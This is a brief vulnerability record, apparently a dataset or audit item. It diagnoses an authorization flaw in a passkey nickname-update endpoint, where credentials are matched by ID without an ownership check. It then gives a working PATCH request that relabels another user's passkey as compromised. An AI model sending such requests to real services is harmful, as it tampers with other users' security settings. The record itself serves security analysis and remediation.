diagnosis: The endpoint updates the display nickname of a registered passkey hardware authenticator. While the route requires user authentication via verifyUserAuth, prisma.passkeyCredential.update matches solely by credentialId without verifying that the credential belongs to req.user.id. Any user can alter descriptive labels of passkeys owned by other users.
exploit_request:
PATCH /api/v1/credentials/passkeys/cred_pk_771924/friendly-name HTTP/1.1
Host: security.identitycloud.com
Authorization: Bearer <user_jwt>
Content-Type: application/json

{"label": "Compromised Key - Do Not Use"}
